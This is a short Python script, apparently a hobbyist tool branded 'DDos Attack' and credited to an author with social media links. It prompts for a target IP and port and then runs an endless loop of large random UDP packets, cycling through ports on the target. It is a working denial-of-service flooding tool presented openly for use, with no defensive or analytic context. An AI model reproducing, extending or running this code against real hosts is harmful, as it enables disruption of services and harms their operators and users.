import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
port = 0
##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(149000)
#############

os.system("clear")
os.system("figlet DDos Attack")
print("\n")
print("Author   : HA-MRX")
print("You Tube : https://www.youtube.com/c/HA-MRX")
print("github   : https://github.com/Ha3MrX")
print("Facebook : https://www.facebook.com/muhamad.jabar222")
print("\n")
ip = input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Attack Starting")
print("[                    ] 0% ")
time.sleep(5)
print("[=====               ] 25%")
time.sleep(5)
print("[==========          ] 50%")
time.sleep(5)
print("[===============     ] 75%")
time.sleep(5)
print("[====================] 100%")
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,int(port)))
     sent = sent + 1
     port = int(port) + 1
     print("Sent "+str(sent)+" packet to "+str(ip)+" throught port: "+str(port))
     if port == 65534:
       port = 1

